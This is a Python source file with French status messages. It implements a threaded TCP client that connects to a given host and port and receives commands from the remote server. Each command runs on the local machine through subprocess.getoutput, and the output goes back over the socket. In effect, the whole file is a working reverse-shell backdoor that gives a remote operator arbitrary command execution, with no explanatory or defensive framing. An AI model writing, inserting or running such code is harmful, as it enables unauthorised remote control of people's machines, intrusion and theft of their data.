import socket
import subprocess
import threading


class ClientThread(threading.Thread):
    def __init__(self, host, port):
        super().__init__()
        self.host = host
        self.port = port
        self.sock = None
        self.running = True

    def run(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            print(f"[+] Connecté au serveur {self.host}:{self.port}")

            while self.running:
                command = self.sock.recv(1024).decode()

                if not command:
                    break

                if command.lower() == "exit":
                    self.running = False
                    break

                output = self.execute_command(command)
                self.sock.send(output.encode())

        except Exception as e:
            print(f"[!] Erreur : {e}")
        finally:
            if self.sock:
                self.sock.close()
            print("[*] Connexion fermée.")

    def execute_command(self, command):
        try:
            result = subprocess.getoutput(command)
            return result if result else "[*] Commande exécutée sans sortie."
        except Exception as e:
            return f"[!] Erreur lors de l'exécution : {str(e)}"
